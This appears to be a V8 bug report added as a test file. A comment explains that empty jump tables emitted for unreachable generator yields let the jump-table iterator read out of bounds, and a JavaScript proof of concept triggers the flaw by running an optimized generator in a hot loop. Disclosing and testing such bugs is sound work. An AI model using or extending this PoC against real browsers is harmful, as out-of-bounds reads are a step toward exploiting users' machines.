@@ -1,0 +1,57 @@
+/*
+In the current implementation, the bytecode generator also emits empty jump tables.
+https://cs.chromium.org/chromium/src/v8/src/interpreter/bytecode-array-writer.cc?rcl=111e990462823c9faeee06b67c0dcf05749d4da8&l=89
+
+So the bytecode for the example code would be generated as follows:
+Code:
+function* opt() {
+    for (;;)
+        if (true) {
+
+        } else {
+            yield;  // never reaches, never hits BindJumpTableEntry
+        }
+}
+
+Bytecode:
+        ...
+         0x35dda532a2a5 @   75 : 90 04 01 01       SwitchOnSmiNoFeedback [4], [1], [1] { }  <<--- SIZE: 1, but EMPTY
+        ...
+
+
+Here's a snippet of JumpTableTargetOffsets::iterator::UpdateAndAdvanceToValid which is used to enumerate a jump table.
+void JumpTableTargetOffsets::iterator::UpdateAndAdvanceToValid() {
+  if (table_offset_ >= table_end_) return;
+
+  current_ = accessor_->GetConstantAtIndex(table_offset_);
+  Isolate* isolate = accessor_->bytecode_array()->GetIsolate();
+  while (current_->IsTheHole(isolate)) {
+    ++table_offset_;
+    ++index_;
+    current_ = accessor_->GetConstantAtIndex(table_offset_);
+  }
+}
+
+If the jump table is empty, table_offset_ may exceed table_end_. As a result, out-of-bounds reads occur.
+
+PoC:
+*/
+
+function* opt() {
+    for (;;)
+        if (true) {
+
+        } else {
+            yield;
+        }
+
+    for (;;)
+        if (true) {
+
+        } else {
+            yield; yield; yield; yield; yield; yield; yield; yield;
+        }
+}
+
+for (let i = 0; i < 100000; i++)
+    opt();
